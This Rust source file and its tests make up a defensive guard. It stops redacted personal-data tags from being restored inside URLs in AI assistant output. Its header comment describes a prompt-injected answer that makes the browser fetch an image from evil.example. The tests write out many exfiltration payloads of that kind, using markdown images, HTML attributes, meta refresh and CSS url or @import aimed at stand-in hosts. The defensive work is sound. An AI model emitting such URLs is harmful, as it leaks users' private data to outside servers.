//! Never restore inside URLs.
//!
//! A prompt-injected answer (or content another user wrote) can ask the
//! browser to fetch `![x](https://evil.example/?d=[NAME_1])`: restoring the
//! tag there would send the real value to that server. [`UrlGuard`] splits
//! text into parts where tags may be restored and URL parts where they stay
//! tags. It follows the syntaxes markdown renderers and browsers use:
//!
//! - CommonMark link and image destinations after `](`, and reference
//!   definitions (after any `]:`; labels may span lines): `<…>` runs to an
//!   unescaped `>` or a line ending; a bare destination runs to ASCII space
//!   or control, or an unbalanced `)`; backslash escapes are honoured; Unicode
//!   whitespace never ends a URL.
//! - Autolinks `<scheme:…>`.
//! - Inside an HTML tag (`<` + letter … `>`), every attribute value; only
//!   TAB, LF, FF, CR and SPACE end an unquoted one, as for browsers.
//! - CSS `url(…)` and `image-set(…)` (quotes honoured, to an unquoted `)`),
//!   and what follows `@import` (to an unquoted `;`, across line breaks).
//!
//! URLs written as plain text (`https://…`, `www.…`, `key=value`) are left
//! to the engine's url-safe restore, which never restores a value after a
//! URL-like run of text; [`Guarded`] tells it about the parts it skips.
//!
//! Text arrives in pieces: every decision is made from characters already
//! seen, and a trigger always ends before the text it guards, so nothing
//! has to be held back.

use crate::jsonfrag::ValueRestorer;

/// One piece of guarded text.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Part {
    /// Inside a URL: tags here must stay tags.
    pub url: bool,
    pub text: String,
}

/// Look-behind kept for keyword triggers (`image-set(` is the longest).
const RECENT_CHARS: usize = 12;
/// Longest autolink scheme (CommonMark: 2–32 characters).
const MAX_SCHEME: u8 = 32;
/// Markdown readings followed at once; more than this protects the rest of
/// the line.
const MAX_THREADS: usize = 8;

/// One markdown reading of the text (a destination or autolink that may
/// have started here).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum Md {
    #[default]
    Free,
    /// Too many readings at once: protect to the end of the line.
    Saturated,
    /// After `](` or `]:`: ASCII whitespace before a destination.
    DestBefore,
    /// `<…>` destination.
    DestPointy { escaped: bool },
    /// Bare destination; `depth` counts open parentheses.
    DestBare { depth: u32, escaped: bool },
    /// After `<` + letter: a possible autolink scheme.
    Scheme { len: u8 },
    /// `<scheme:…>`.
    Autolink,
}

/// The HTML / CSS reading of the text.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum Html {
    #[default]
    Free,
    /// Inside a tag; `name` while the tag name is being read.
    Tag {
        name: bool,
    },
    /// After `=` in a tag: ASCII whitespace before the value.
    ValueBefore,
    ValueQuoted(char),
    ValueBare,
    /// `url(` / `image-set(`: to an unquoted `)` at depth 0.
    CssFn {
        depth: u32,
        quote: Option<char>,
        escaped: bool,
    },
    /// After `@import`: to an unquoted `;`.
    CssImport {
        quote: Option<char>,
    },
}

/// Splits a stream of text into URL and non-URL parts. Markdown and HTML
/// are read side by side, and every place a markdown destination could
/// start is followed (a construct can turn out to be unterminated, or hide
/// another): a character is inside a URL if any reading says so.
#[derive(Debug, Default)]
pub struct UrlGuard {
    /// Markdown readings in progress (never `Free`).
    md: Vec<Md>,
    html: Html,
    /// The last characters seen, lower-cased.
    recent: String,
    prev: Option<char>,
}

fn ascii_space_or_control(c: char) -> bool {
    (c as u32) <= 0x20 || c as u32 == 0x7f
}

/// Whitespace to an HTML tokenizer: TAB, LF, FF, CR, SPACE (any other
/// control character stays inside a name or value).
fn html_space(c: char) -> bool {
    matches!(c, '\t' | '\n' | '\x0c' | '\r' | ' ')
}

fn line_ending(c: char) -> bool {
    c == '\n' || c == '\r'
}

impl UrlGuard {
    /// The parts of the next piece of text.
    pub fn split(&mut self, text: &str) -> Vec<Part> {
        let mut parts: Vec<Part> = Vec::new();
        for c in text.chars() {
            let url = self.step(c);
            match parts.last_mut() {
                Some(p) if p.url == url => p.text.push(c),
                _ => parts.push(Part {
                    url,
                    text: c.to_string(),
                }),
            }
        }
        parts
    }

    /// Is `c` part of a URL? Moves every reading on.
    fn step(&mut self, c: char) -> bool {
        let prev = self.prev;
        let mut url = false;
        let mut md: Vec<Md> = Vec::with_capacity(self.md.len() + 1);
        for state in std::mem::take(&mut self.md) {
            let (u, next) = md_step(state, c);
            url |= u;
            if next != Md::Free && !md.contains(&next) {
                md.push(next);
            }
        }
        let (html_url, html) = html_step(self.html, c);
        url |= html_url;
        self.remember(c);
        // A destination or autolink may start after `c`, whatever else is
        // going on.
        if let Some(start) = self.md_trigger(c, prev)
            && !md.contains(&start)
        {
            md.push(start);
        }
        if md.len() > MAX_THREADS {
            md = vec![Md::Saturated];
        }
        self.md = md;
        self.html = if html == Html::Free && !html_url {
            self.html_trigger(c, prev)
        } else {
            html
        };
        url
    }

    fn remember(&mut self, c: char) {
        self.prev = Some(c);
        self.recent.extend(c.to_lowercase());
        let excess = self.recent.chars().count().saturating_sub(RECENT_CHARS);
        if excess > 0 {
            let cut = self
                .recent
                .char_indices()
                .nth(excess)
                .map_or(self.recent.len(), |(i, _)| i);
            self.recent.drain(..cut);
        }
    }

    /// Does a markdown destination or autolink start after `c`?
    fn md_trigger(&self, c: char, prev: Option<char>) -> Option<Md> {
        // Every `](` and every `]:` (reference labels may span lines):
        // guarding more is cheap.
        if (c == '(' || c == ':') && prev == Some(']') {
            Some(Md::DestBefore)
        } else if c.is_ascii_alphabetic() && prev == Some('<') {
            Some(Md::Scheme { len: 1 })
        } else {
            None
        }
    }

    /// Does `c` (just seen, outside any tag or CSS URL) start one?
    fn html_trigger(&self, c: char, prev: Option<char>) -> Html {
        let r = &self.recent;
        if c.is_ascii_alphabetic() && prev == Some('<') {
            Html::Tag { name: true }
        } else if r.ends_with("url(") || r.ends_with("image-set(") {
            Html::CssFn {
                depth: 0,
                quote: None,
                escaped: false,
            }
        } else if r.ends_with("@import") {
            Html::CssImport { quote: None }
        } else {
            Html::Free
        }
    }
}

/// One character of the markdown reading.
fn md_step(state: Md, c: char) -> (bool, Md) {
    match state {
        Md::Free => (false, Md::Free),
        Md::Saturated => {
            if line_ending(c) {
                (false, Md::Free)
            } else {
                (true, Md::Saturated)
            }
        }
        Md::DestBefore => {
            if ascii_space_or_control(c) {
                (false, Md::DestBefore)
            } else if c == '<' {
                (false, Md::DestPointy { escaped: false })
            } else {
                bare(c, 0)
            }
        }
        Md::DestPointy { escaped: true } => (true, Md::DestPointy { escaped: false }),
        Md::DestPointy { escaped: false } => match c {
            '\\' => (true, Md::DestPointy { escaped: true }),
            '>' => (false, Md::Free),
            c if line_ending(c) => (false, Md::Free),
            _ => (true, Md::DestPointy { escaped: false }),
        },
        Md::DestBare {
            depth,
            escaped: true,
        } => (
            true,
            Md::DestBare {
                depth,
                escaped: false,
            },
        ),
        Md::DestBare {
            depth,
            escaped: false,
        } => bare(c, depth),
        Md::Scheme { len } => {
            if c == ':' && len >= 2 {
                (true, Md::Autolink)
            } else if (c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'))
                && len < MAX_SCHEME
            {
                (false, Md::Scheme { len: len + 1 })
            } else {
                (false, Md::Free)
            }
        }
        Md::Autolink => {
            if c == '>' || c == '<' || ascii_space_or_control(c) {
                (false, Md::Free)
            } else {
                (true, Md::Autolink)
            }
        }
    }
}

/// One character of a bare destination.
fn bare(c: char, depth: u32) -> (bool, Md) {
    match c {
        '\\' => (
            true,
            Md::DestBare {
                depth,
                escaped: true,
            },
        ),
        c if ascii_space_or_control(c) => (false, Md::Free),
        '(' => (
            true,
            Md::DestBare {
                depth: depth + 1,
                escaped: false,
            },
        ),
        ')' if depth == 0 => (false, Md::Free),
        ')' => (
            true,
            Md::DestBare {
                depth: depth - 1,
                escaped: false,
            },
        ),
        _ => (
            true,
            Md::DestBare {
                depth,
                escaped: false,
            },
        ),
    }
}

/// One character of the HTML / CSS reading.
fn html_step(state: Html, c: char) -> (bool, Html) {
    match state {
        Html::Free => (false, Html::Free),
        Html::Tag { name } => match c {
            '>' => (false, Html::Free),
            '=' if !name => (false, Html::ValueBefore),
            c if html_space(c) || c == '/' => (false, Html::Tag { name: false }),
            _ => (false, Html::Tag { name }),
        },
        Html::ValueBefore => {
            if html_space(c) {
                (false, Html::ValueBefore)
            } else if c == '"' || c == '\'' {
                (false, Html::ValueQuoted(c))
            } else if c == '>' {
                (false, Html::Free)
            } else {
                (true, Html::ValueBare)
            }
        }
        Html::ValueQuoted(q) => {
            if c == q {
                (false, Html::Tag { name: false })
            } else {
                (true, Html::ValueQuoted(q))
            }
        }
        Html::ValueBare => {
            if c == '>' {
                (false, Html::Free)
            } else if html_space(c) {
                (false, Html::Tag { name: false })
            } else {
                (true, Html::ValueBare)
            }
        }
        Html::CssFn {
            depth,
            quote,
            escaped,
        } => {
            let next = |depth, quote, escaped| Html::CssFn {
                depth,
                quote,
                escaped,
            };
            if escaped {
                (true, next(depth, quote, false))
            } else if c == '\\' {
                (true, next(depth, quote, true))
            } else if let Some(q) = quote {
                (true, next(depth, (c != q).then_some(q), false))
            } else {
                match c {
                    '"' | '\'' => (true, next(depth, Some(c), false)),
                    '(' => (true, next(depth + 1, None, false)),
                    ')' if depth == 0 => (false, Html::Free),
                    ')' => (true, next(depth - 1, None, false)),
                    _ => (true, next(depth, None, false)),
                }
            }
        }
        Html::CssImport { quote: Some(q) } => (
            true,
            Html::CssImport {
                quote: (c != q).then_some(q),
            },
        ),
        // CSS allows any whitespace (line breaks too) after `@import`.
        Html::CssImport { quote: None } => match c {
            ';' => (false, Html::Free),
            '"' | '\'' => (true, Html::CssImport { quote: Some(c) }),
            _ => (true, Html::CssImport { quote: None }),
        },
    }
}

/// A restorer that leaves URL parts alone and tells the inner restorer
/// about them (so its own URL rule sees the whole text).
pub struct Guarded<R> {
    guard: UrlGuard,
    inner: R,
}

impl<R: ValueRestorer> Guarded<R> {
    pub fn new(inner: R) -> Self {
        Guarded {
            guard: UrlGuard::default(),
            inner,
        }
    }
}

impl<R: ValueRestorer> ValueRestorer for Guarded<R> {
    fn push(&mut self, text: &str) -> String {
        let mut out = String::with_capacity(text.len());
        for part in self.guard.split(text) {
            if part.url {
                // Whatever came before the URL is decided now.
                out.push_str(&self.inner.finish());
                self.inner.skip(&part.text);
                out.push_str(&part.text);
            } else {
                out.push_str(&self.inner.push(&part.text));
            }
        }
        out
    }

    fn finish(&mut self) -> String {
        self.inner.finish()
    }

    fn pending_len(&self) -> usize {
        self.inner.pending_len()
    }

    fn skip(&mut self, text: &str) {
        let _ = self.guard.split(text);
        self.inner.skip(text);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The text with URL parts in `⟨…⟩`.
    fn marked(pieces: &[&str]) -> String {
        let mut g = UrlGuard::default();
        let mut out = String::new();
        let mut in_url = false;
        for piece in pieces {
            for part in g.split(piece) {
                if part.url != in_url {
                    out.push(if part.url { '⟨' } else { '⟩' });
                    in_url = part.url;
                }
                out.push_str(&part.text);
            }
        }
        if in_url {
            out.push('⟩');
        }
        out
    }

    #[test]
    fn markdown_destinations_follow_commonmark() {
        for (input, want) in [
            (
                "see ![x](https://evil.example/?d=[NAME_1]) and [NAME_1]",
                "see ![x](⟨https://evil.example/?d=[NAME_1]⟩) and [NAME_1]",
            ),
            // An escaped `>` does not close a pointy destination.
            (
                "![x](<//evil.example/?d=\\>[NAME_1]>) [NAME_1]",
                "![x](<⟨//evil.example/?d=\\>[NAME_1]⟩>) [NAME_1]",
            ),
            (
                "[x](<a b [NAME_1]>) [NAME_1]",
                "[x](<⟨a b [NAME_1]⟩>) [NAME_1]",
            ),
            ("[x](<a\r[NAME_1]>)", "[x](<⟨a⟩\r[NAME_1]>)"),
            // Unicode whitespace never ends a bare destination.
            (
                "![x](https://e/?d=\u{a0}[NAME_1]) [NAME_1]",
                "![x](⟨https://e/?d=\u{a0}[NAME_1]⟩) [NAME_1]",
            ),
            (
                "![x](https://e/?d=\u{3000}[NAME_1]) [NAME_1]",
                "![x](⟨https://e/?d=\u{3000}[NAME_1]⟩) [NAME_1]",
            ),
            // Balanced and escaped parentheses stay inside.
            ("[x](a(b)c[NAME_1]) z", "[x](⟨a(b)c[NAME_1]⟩) z"),
            ("[x](a\\)b[NAME_1]) z", "[x](⟨a\\)b[NAME_1]⟩) z"),
            (
                "[x]( //evil/[NAME_1] ) [NAME_1]",
                "[x]( ⟨//evil/[NAME_1]⟩ ) [NAME_1]",
            ),
            ("[NAME_1](note) [NAME_1]", "[NAME_1](⟨note⟩) [NAME_1]"),
            ("plain [NAME_1] text", "plain [NAME_1] text"),
        ] {
            assert_eq!(marked(&[input]), want, "{input}");
        }
    }

    #[test]
    fn reference_definitions_anywhere_on_a_line() {
        for (input, want) in [
            (
                "> [r]: //evil.example/?d=[NAME_1]\n\n![x][r]",
                "> [r]: ⟨//evil.example/?d=[NAME_1]⟩\n\n![x][r]",
            ),
            ("- [r]: //e/[NAME_1]\n", "- [r]: ⟨//e/[NAME_1]⟩\n"),
            ("1) [r]: //e/[NAME_1]\n", "1) [r]: ⟨//e/[NAME_1]⟩\n"),
            (
                "hi\r[r]: //e/[NAME_1]\r\r![x][r]",
                "hi\r[r]: ⟨//e/[NAME_1]⟩\r\r![x][r]",
            ),
            (
                "  [1]: <a b [NAME_1]>\n[NAME_1]",
                "  [1]: <⟨a b [NAME_1]⟩>\n[NAME_1]",
            ),
            // Over-protection is cheap: the value after `[x]:` stays a tag.
            ("[NAME_1]: [EMAIL_1] ok", "[NAME_1]: ⟨[EMAIL_1]⟩ ok"),
            ("a: [NAME_1]", "a: [NAME_1]"),
            // A label may span lines.
            (
                "[r\nx]: <//e/?d= [NAME_1]>\n![a][r x]",
                "[r\nx]: <⟨//e/?d= [NAME_1]⟩>\n![a][r x]",
            ),
            // An unterminated autolink is text: the `](` in it still starts
            // a destination after the line ending.
            ("<http:![i](\r[EMAIL_1] x", "<http⟨:![i](⟩\r⟨[EMAIL_1]⟩ x"),
            // HTML inside a failed markdown destination is still HTML.
            (
                "](< <img src=\"\n> [NAME_1]\">",
                "](<⟨ <img src=\"\n> [NAME_1]⟩\">",
            ),
        ] {
            assert_eq!(marked(&[input]), want, "{input:?}");
        }
    }

    #[test]
    fn autolinks_html_attributes_and_css() {
        for (input, want) in [
            (
                "<http:evil.example/?d=[NAME_1]> [NAME_1]",
                "<http⟨:evil.example/?d=[NAME_1]⟩> [NAME_1]",
            ),
            (
                "<link rel=preload imagesrcset=\"//e/?d=[NAME_1] 1x\">[NAME_1]",
                "<link rel=⟨preload⟩ imagesrcset=\"⟨//e/?d=[NAME_1] 1x⟩\">[NAME_1]",
            ),
            (
                "<a ping='//e/[NAME_1]' href=\"#\">x [NAME_1]</a>",
                "<a ping='⟨//e/[NAME_1]⟩' href=\"⟨#⟩\">x [NAME_1]</a>",
            ),
            (
                "<meta http-equiv=refresh content=\"0;url=//e/[NAME_1]\">",
                "<meta http-equiv=⟨refresh⟩ content=\"⟨0;url=//e/[NAME_1]⟩\">",
            ),
            (
                "<img src       \t   =\"//e/[NAME_1]\">",
                "<img src       \t   =\"⟨//e/[NAME_1]⟩\">",
            ),
            // Only HTML whitespace ends an unquoted value.
            (
                "<img src=//e/?d=\u{1}[NAME_1]>[NAME_1]",
                "<img src=⟨//e/?d=\u{1}[NAME_1]⟩>[NAME_1]",
            ),
            (
                "<style>@import\n\"//e/?[NAME_1]\";</style>",
                "<style>@import⟨\n\"//e/?[NAME_1]\"⟩;</style>",
            ),
            (
                "<style>@import \"//e/[NAME_1]\"; p{}</style>",
                "<style>@import⟨ \"//e/[NAME_1]\"⟩; p{}</style>",
            ),
            (
                "x{background:url('//e/?x=)[NAME_1]')} [NAME_1]",
                "x{background:url(⟨'//e/?x=)[NAME_1]'⟩)} [NAME_1]",
            ),
            (
                "x{background:url(\n'//e/[NAME_1]')} [NAME_1]",
                "x{background:url(⟨\n'//e/[NAME_1]'⟩)} [NAME_1]",
            ),
            (
                "x{b:image-set(\"//e/[NAME_1]\" 1x)} [NAME_1]",
                "x{b:image-set(⟨\"//e/[NAME_1]\" 1x⟩)} [NAME_1]",
            ),
        ] {
            assert_eq!(marked(&[input]), want, "{input:?}");
        }
    }

    #[test]
    fn any_split_gives_the_same_parts() {
        let text = "a ![i](<https://e/?q=\\>[NAME_1]>) b <img src='x[NAME_1]'> [NAME_1]\n\
                    > [r]: /y/[NAME_1] c\r[s]: <q r>\nurl(\"a)\" [NAME_1]) <http:x[NAME_1]> z";
        let whole = marked(&[text]);
        let chars: Vec<char> = text.chars().collect();
        for n in 1..9 {
            let pieces: Vec<String> = chars.chunks(n).map(|c| c.iter().collect()).collect();
            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
            assert_eq!(marked(&refs), whole, "pieces of {n}");
        }
    }

    /// Replaces `[NAME_1]` with `Ravi`, holding back an unclosed `[` run;
    /// records what it was told to skip.
    struct Fake(String, String);

    impl ValueRestorer for Fake {
        fn push(&mut self, text: &str) -> String {
            self.0.push_str(text);
            let cut = self.0.rfind('[').filter(|&i| !self.0[i..].contains(']'));
            let keep = cut.map_or(String::new(), |i| self.0.split_off(i));
            let out = std::mem::replace(&mut self.0, keep);
            out.replace("[NAME_1]", "Ravi")
        }
        fn finish(&mut self) -> String {
            std::mem::take(&mut self.0).replace("[NAME_1]", "Ravi")
        }
        fn pending_len(&self) -> usize {
            self.0.len()
        }
        fn skip(&mut self, text: &str) {
            self.1.push_str(text);
        }
    }

    #[test]
    fn guarded_restore_keeps_tags_in_urls() {
        let mut g = Guarded::new(Fake(String::new(), String::new()));
        let mut out = String::new();
        for piece in [
            "Hi [NA",
            "ME_1], see ![x](https://e/?d=[NA",
            "ME_1]) and [NAME_1]",
        ] {
            out.push_str(&g.push(piece));
        }
        out.push_str(&g.finish());
        assert_eq!(out, "Hi Ravi, see ![x](https://e/?d=[NAME_1]) and Ravi");
        assert_eq!(g.inner.1, "https://e/?d=[NAME_1]");
    }
}
